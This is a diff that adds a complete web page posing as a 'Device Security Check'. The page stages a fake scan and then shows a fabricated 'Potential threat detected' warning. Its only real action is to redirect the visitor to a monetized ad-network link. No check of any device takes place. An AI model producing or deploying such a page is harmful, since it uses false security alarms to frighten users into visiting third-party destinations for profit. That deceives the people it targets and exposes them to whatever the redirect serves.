@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Security Check</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-color: #0f172a;
+      --text-color: #e2e8f0;
+      --accent-color: #38bdf8;
+      --warn-color: #facc15;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background-color: #1e293b;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+
+    p {
+      font-size: 1rem;
+      line-height: 1.6;
+      margin-bottom: 24px;
+      color: #cbd5e1;
+    }
+
+    .scan-button {
+      background-color: var(--accent-color);
+      color: #000;
+      border: none;
+      padding: 14px 28px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .scan-button:hover {
+      background-color: #0ea5e9;
+    }
+
+    .loading, .redirect-msg {
+      margin-top: 24px;
+      font-size: 1.1rem;
+      display: none;
+    }
+
+    .redirect-msg {
+      color: var(--warn-color);
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔐 Device Security Check</h1>
+    <p>This quick scan will check your device for vulnerabilities or suspicious background activity. Start the check below.</p>
+    <button class="scan-button" onclick="startScan()">Start Security Check</button>
+    <div class="loading" id="loading">🔍 Scanning system... Please wait.</div>
+    <div class="redirect-msg" id="redirectMsg">⚠️ Potential threat detected. Redirecting to detailed report...</div>
+  </div>
+
+  <script>
+    function startScan() {
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('redirectMsg').style.display = 'block';
+        setTimeout(() => {
+          window.location.href = "https://www.profitableratecpm.com/jpwq7kwq?key=e00fcac101e1f824b271f154a9b46de7";
+        }, 3000);
+      }, 4000);
+    }
+  </script>
+</body>
+</html>
